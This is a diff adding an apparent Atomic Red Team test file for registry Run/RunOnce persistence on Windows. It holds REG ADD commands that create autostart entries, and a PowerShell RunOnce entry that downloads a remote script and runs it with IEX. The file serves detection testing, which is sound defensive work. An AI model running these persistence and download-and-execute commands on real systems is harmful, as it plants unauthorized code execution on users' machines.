@@ -1,0 +1,58 @@
+attack_technique:
+- T1547.001
+display_name: Registry Run Keys / Startup Folder
+atomic_tests:
+- name: Reg Key Run
+  description: "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. \n"
+  supported_platforms:
+  - windows
+  input_arguments:
+    command_to_execute:
+      description: Thing to Run
+      type: Path
+      default: C:\Path\AtomicRedTeam.exe
+  executor:
+    command: |
+      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+    cleanup_command: |
+      REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
+    name: command_prompt
+- name: Reg Key RunOnce
+  description: "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n"
+  supported_platforms:
+  - windows
+  input_arguments:
+    thing_to_execute:
+      description: Thing to Run
+      type: Path
+      default: C:\Path\AtomicRedTeam.dll
+  executor:
+    command: |
+      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
+    cleanup_command: |
+      REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
+    name: command_prompt
+- name: PowerShell Registry RunOnce
+  description: |
+    RunOnce Key Persistence via PowerShell
+    Upon successful execution, a new entry will be added to the runonce item in the registry.
+  supported_platforms:
+  - windows
+  input_arguments:
+    thing_to_execute:
+      description: Thing to Run
+      type: Path
+      default: powershell.exe
+    reg_key_path:
+      description: Path to registry key to update
+      type: Path
+      default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+  executor:
+    command: |
+      $RunOnceKey = "#{reg_key_path}"
+      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+    cleanup_command: |
+      Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+
